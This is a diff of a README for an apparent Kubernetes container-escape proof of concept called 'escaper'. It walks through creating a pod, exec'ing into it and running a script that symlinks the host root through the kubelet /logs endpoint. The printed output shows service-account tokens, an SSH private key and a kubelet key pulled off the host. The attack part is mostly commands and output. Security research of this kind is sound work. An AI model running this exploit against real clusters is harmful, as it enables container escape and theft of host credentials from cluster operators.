@@ -17,8 +17,8 @@ Without restriction for retrieving logs with `kubectl logs <pod>`
 First, create the pod by:
     
 ```bash
-$ kubectl create -f pods/
-pod/escaper created
+$ kubectl create -f escaper.yml
+pod "escaper" created
 ```
 
 After the pod was created, exec into the escaper pod.
@@ -54,10 +54,14 @@ $ kubectl exec -it escaper bash
 ➜ root@escaper:~/exploit$ python find_sensitive_files.py
 [*] Got access to kubelet /logs endpoint
 [+] creating symlink to host root folder inside /var/log
+
 [*] fetching token files from host
 [+] extracted hostfile: /var/lib/kubelet/pods/6d67bed2-abe3-11e9-9888-42010a8e020e/volumes/kubernetes.io~secret/metadata-agent-token-xjfh9/token
+
 [*] fetching private key files from host
 [+] extracted hostfile: /home/ubuntu/.ssh/private.key
+[+] extracted hostfile: /etc/srv/kubernetes/pki/kubelet.key
+...
 ```
 Token Files are downloaded to: `/root/exploit/host_files/tokens`  
 Key Files are downloaded to: `/root/exploit/host_files/private_keys`
